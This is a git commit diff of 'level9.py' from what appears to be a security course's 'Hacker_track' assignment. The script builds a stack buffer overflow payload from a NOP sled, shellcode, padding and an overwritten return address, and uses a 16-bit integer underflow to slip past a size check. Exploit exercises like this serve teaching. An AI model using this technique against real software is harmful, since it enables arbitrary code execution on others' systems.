9968153f4bb685d064e7d8c9e37bcc36cbaa8a9c
Marlon Fendler <marlon.fendler24@gmail.com>
2026-03-31 17:34:07 +0200

    level9.py

--- assignment_2/Hacker_track/level9.py
+++ assignment_2/Hacker_track/level9.py
@@ -9,28 +9,30 @@ if len(sys.argv) != 3:
 
 bytes_till_return_address = int(sys.argv[1])
 
+
 tmp = bytes_till_return_address + 8
+
+total_overflow_buffer_size = tmp + ((4 - (tmp % 4)) % 4) # till return address + 8 for return address and then round up to the nearest multiple of 4 for proper integer packing
 
 if len(raw_shellcode) > bytes_till_return_address:
     raise ValueError(f"Shellcode is too long to fit in the buffer till the return address ({len(raw_shellcode)} > {bytes_till_return_address}). Gotta reduce the shellcode size or increase the buffer size.")
 
 # buffer is (32 ints -> 128 bytes), put the shellcode at the end and then nops before
+
 nop_sled = b"\x90" * (32 * 4 - len(raw_shellcode))
+
+
+return_address = struct.pack("<Q", int(sys.argv[2], 16))  # Get the return address from command line argument
+
 buffer = nop_sled + raw_shellcode
 
-# Get the return address from command line argument
-return_address = struct.pack("<Q", int(sys.argv[2], 16))
+padding_before_return_address = b"A" * (bytes_till_return_address - len(buffer))  # Pad the rest till  with "A"s to reach the total overflow buffer size
 
-# Get the padding between the end of the buffer and the return address
-# which we pad with "A"s to reach the total overflow buffer size
-padding_between_buffer_return_address = b"A" * (bytes_till_return_address - len(buffer))
+overflow_buffer = buffer + padding_before_return_address + return_address
 
-overflow_buffer = buffer + padding_between_buffer_return_address + return_address
-
-# till return address + 8 for return address and then round up to the nearest multiple of 4 for proper integer packing
-total_overflow_buffer_size = len(overflow_buffer)
 
 num_integer_input = int((total_overflow_buffer_size / 4) - (65535 + 1))   # use underflow to pass < 32 check but still get >= 32 integers potentially (num_integers fitting in buffer) - (max unsigned 16-bit integer + 1)
+
 
 output = f"{num_integer_input}\n"
 
@@ -42,3 +44,5 @@ for i in range(0, total_overflow_buffer_size, 4):
     output += f"{decimal_value}\n"
 
 sys.stdout.buffer.write(output.encode())
+
+
